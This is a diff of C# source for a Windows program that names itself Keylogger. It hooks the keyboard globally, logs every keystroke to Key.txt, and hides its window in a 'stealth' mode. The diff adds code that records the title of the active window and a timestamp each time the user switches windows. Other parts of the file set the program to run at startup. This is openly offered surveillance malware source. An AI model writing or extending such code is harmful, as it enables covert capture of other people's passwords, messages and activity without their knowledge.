@@ -1,17 +1,20 @@
 ﻿using System;
-using System.Diagnostics;
 using System.Globalization;
 using System.IO;
 using System.Windows;
 using System.Windows.Controls;
 using System.Runtime.InteropServices;
-using System.Windows.Input;
 using System.Windows.Interop;
 using System.Windows.Threading;
 using System.Linq;
-using System.Globalization;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Windows.Input;
+using Application = System.Windows.Application;
+using MessageBox = System.Windows.MessageBox;
+using MouseEventArgs = System.Windows.Forms.MouseEventArgs;
 
 
 namespace Keylogger
@@ -22,28 +25,26 @@ namespace Keylogger
     public partial class MainWindow : Window
     {
         #region WinAPI
-        //[DllImport("user32.dll")]
-        //private static extern IntPtr FindWindow(string sClassName, string sAppName );
-
         [DllImport("user32.dll")]
         private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModiefier, uint vk);
-
         [DllImport("user32.dll")]
         private static extern bool UnregisterHotKey(IntPtr hWnd, int id);
-        #endregion
-
-        DispatcherTimer timer = new DispatcherTimer();
-
-        //Keylog keylog = new Keylog();
-
-        #region Language
-
         [DllImport("user32.dll")]
         static extern IntPtr GetKeyboardLayout(uint idThread);
         [DllImport("user32.dll")]
         private static extern IntPtr GetForegroundWindow();
         [DllImport("user32.dll")]
         static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr processId);
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern int GetWindowText(int hWnd, StringBuilder text, int count);
+        
+
+        #endregion
+
+        DispatcherTimer timer = new DispatcherTimer();
+        string datatime = String.Empty;
+
+        #region Language
 
         private CultureInfo _currentLanaguge;
 
@@ -59,7 +60,8 @@ namespace Keylogger
             if (_currentLanaguge == null || _currentLanaguge.LCID != currentCulture.LCID)
             {
                 _currentLanaguge = currentCulture;
-               // MessageBox.Show(_currentLanaguge.Name);
+               // language.Content = _currentLanaguge.Name.ToString();
+                // MessageBox.Show(_currentLanaguge.Name);
             }
         }
 
@@ -84,16 +86,48 @@ namespace Keylogger
                 }
             });
 
-
         }
 
-       
+       static string winTitle = String.Empty;
+
+        //private void button1_MouseDown(object sender, MouseEventArgs e)
+        //{
+        //    if (MouseButtons.Left)
+        //    {
+        //        MessageBox.Show("Вы нажали Левую кнопку, координаты курсора - " );
+        //    }
+        //}
+
+        public static string GetActiveWindow()
+        {
+            const int cChars = 256;
+            IntPtr ihandler = IntPtr.Zero;
+            StringBuilder sBuff = new StringBuilder(cChars);
+            ihandler = GetForegroundWindow();
+            if (GetWindowText(ihandler.ToInt32(), sBuff, cChars) > 0)
+                return sBuff.ToString();
+            return "";
+        }
+
+        public static bool IsWindowChanged()
+        {
+
+            string wTitle = GetActiveWindow();
+
+            // проверяем 
+            bool res = wTitle != winTitle;
+
+            winTitle = wTitle; // записываем активное кно на хранения для следующего сравнения
+            return res; // и возвращаем результат comments
+        }
 
         #region KEY_WRITE
 
         globalKeyboardHook gkh = new globalKeyboardHook();
         private int nextline = 0;
-       
+
+        #region Alphabet
+
         char[] RKey = new char[] { '0','1', '2', '3', '4', '5', '6', '7', '8', '9', 'Ё', 'Х', 'Ъ','Ж','Э','Б','Ю','.',
             'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Г', 'Ш', 'Щ', 'З','Ф', 'Ы', 'В', 'А', 'П',
             'Р', 'О', 'Л', 'Д', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь'};
@@ -156,43 +190,39 @@ namespace Keylogger
                 System.Windows.Forms.Keys.N,
                 System.Windows.Forms.Keys.M
         };
-        //private void HookAll()
-        //{
-        //    //foreach (object key in Enum.GetValues(typeof(System.Windows.Forms.Keys)))
-        //    //{
-        //    //    gkh.HookedKeys.Add((System.Windows.Forms.Keys)key);
-        //    //}
-        //}
-        private void Form1_Load()
+
+        #endregion
+        
+        private void KeysLoad()
         {
             gkh.KeyDown += new System.Windows.Forms.KeyEventHandler(gkh_KeyDown);
-            //HookAll();
-            if (File.Exists(AutoRun.Path() + "Key.txt"))
-            {
-                //File.Delete(AutoRun.Path() + "Key.txt");
-            }
+            //if (File.Exists(AutoRun.Path() + "Key.txt"))
+            //{
+            //    //File.Delete(AutoRun.Path() + "Key.txt"); тест 7
+            //}
         }
         void gkh_KeyDown(object sender, System.Windows.Forms.KeyEventArgs e)
         {
-            //StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
-            
             bool nonNumberEntered = false;
             
-            //System.Windows.Forms.InputLanguage myCurrentLanguage = System.Windows.Forms.InputLanguage.CurrentInputLanguage;
-            //string ilm = myCurrentLanguage.LayoutName;
-            //Process curProcess = new Process();
-            //ProcessModule curModule = curProcess.MainModule;
-
-            //MessageBox.Show(ilm);
-
             using (StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true))
             {
+               
+                if (IsWindowChanged())
+                {
+                    datatime = DateTime.Now.ToString();
+                    SW.WriteLine();
+                    SW.WriteLine();
+                    SW.WriteLine(datatime + "\t" + winTitle);
+                    SW.WriteLine();
+                    
+                }
                 if (nextline >= 70)
                 {
                     SW.WriteLine();
                     nextline = 0;
                 }
-                
+
                 #region KEYS
                 
                 if (!keys.Contains(e.KeyCode))
@@ -421,9 +451,6 @@ namespace Keylogger
             CheckAuto.IsChecked = Properties.Settings.Default.AutoRunProp;
             CheckStealth.IsChecked = Properties.Settings.Default.StealthProp;
             txtNum.Text = Properties.Settings.Default.txtNumTimerProp;
-
-            //IntPtr thisWindow = FindWindow(null, "MainWindow");
-            //RegistryHotKey(thisWindow, 1, (uint)WindowsHotKey.Ctrl , (uint)Key.V);
         }
 
         private void Window_Closed(object sender, EventArgs e)
@@ -434,38 +461,31 @@ namespace Keylogger
             Properties.Settings.Default.Save();
         }
 
-
-         
-
-     private void AutoRun_Check(object sender, RoutedEventArgs e)
+        private void AutoRun_Check(object sender, RoutedEventArgs e)
      {
          AutoRun.SetAutoRun(true, AutoRun.Path() + "Keylogger.exe"); 
      }
 
-     private void AutoRun_UnChecked(object sender, RoutedEventArgs e) 
+        private void AutoRun_UnChecked(object sender, RoutedEventArgs e) 
      {
          AutoRun.SetAutoRun(false, AutoRun.Path() + "Keylogger.exe");
      }
 
-
-     private void Stealth_Checked(object sender, RoutedEventArgs e)
+        private void Stealth_Checked(object sender, RoutedEventArgs e)
         {
             Application.Current.MainWindow.Visibility = Visibility.Hidden;
-            //keylog.SetHook();
-            Form1_Load();
+            KeysLoad();
         }
 
-     private void Stealth_Unchecked(object sender, RoutedEventArgs e)
+        private void Stealth_Unchecked(object sender, RoutedEventArgs e)
         {
             Application.Current.MainWindow.Visibility = Visibility.Visible;
-            //keylog.Unhook();
         }
 
         private void tblock_TextChanged(object sender, TextChangedEventArgs e)
         {
 
         }
-
         
     }
 }
